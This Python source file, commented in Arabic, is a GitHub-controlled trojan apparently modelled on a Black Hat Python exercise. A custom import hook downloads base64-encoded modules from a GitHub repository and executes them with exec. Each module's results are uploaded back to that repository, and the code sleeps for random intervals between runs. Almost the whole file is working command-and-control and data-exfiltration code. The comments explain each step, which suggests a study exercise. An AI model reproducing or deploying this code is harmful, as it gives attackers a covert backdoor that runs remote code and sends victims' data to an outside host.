import base64 #  base64 تُستخدم لتشفير وفك تشفير البيانات باستخدام ترميز 
import github3  # GitHub (API) الخاصة بـ مكتبة تتيح لك التفاعل مع واجهة برمجة التطبيقات 
import json   #  تُستخدم للوصول إلى معلومات النظام، مثل استيراد الوحدات، والتعامل مع استثناءات، وإدارة مسارات البحث عن الوحدات
import sys
import importlib # تُستخدم لاستيراد الوحدات ديناميكيًا في بايثون
import time
import random
import threading # تُستخدم لإنشاء وإدارة الخيوط
from datetime import datetime

def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'mohammedhasan2'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')

def get_file_contents(dirname, module_name, repo):
    try:
        return repo.get_file_contents(f"{dirname}/{module_name}/").content
    except Exception as e:
        print(f"Error retrieving file: {e}")
        return None 

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)  #  تُستخدم لتنفيذ كود بايثون من نص
        sys.modules[spec.name] = new_module
        return new_module

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
        #################################

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo) # استرداد محتوى ملف الإعدادات
        config = json.loads(base64.b64decode(config_json)) # فك ترميز البيانات
        
        for task in config:
            if task['module'] not in sys.modules:
                importlib.import_module(task['module'])
        return config # تُرجع الكائن config بعد فك ترميزه

    def module_runner(self, module):
        result = sys.modules[module].run() # يقوم بالوصول إلى الوحدة المسماة module في قاموس sys.modules، والذي يحتوي على جميع الوحدات التي تم استيرادها في البرنامج
        self.store_module_result(result) # 

    def store_module_result(self, data):
        message = datetime.now().isoformat()  # يقوم بالحصول على الوقت الحالي وتنسيقه كسلسلة نصية باستخدام تنسيق ISO 8601
        remote_path = f'data/{self.id}/{message}.data' # تحديد مسار التخزين

        bindata = bytes('%r' % data, 'utf-8') # تحويل البيانات إلى بايتات
        self.repo.create_file(remote_path, message, base64.b64encode(bindata)) #  تستدعي دالة لإنشاء ملف في مستودع github

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)  # Pass as a tuple
                )
                thread.start()
                time.sleep(random.randint(1, 10))  # فترة الانتظار العشوائية
            time.sleep(random.randint(30*60, 30*60*60))  # فترة الانتظار بعد تنفيذ جميع المهام

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())  #  قائمة من الكائنات التي تُستخدم للبحث عن الوحدات عند استيرادها. يمكن إضافة كائنات جديدة لهذه القائمة، مما يتيح لها التحكم في كيفية استيراد الوحدات
    trojan = Trojan('abc')  #   abc و يعطيه معرف Trojan يُنشئ كائنًا جديدًا من فئة  
    trojan.run()                    
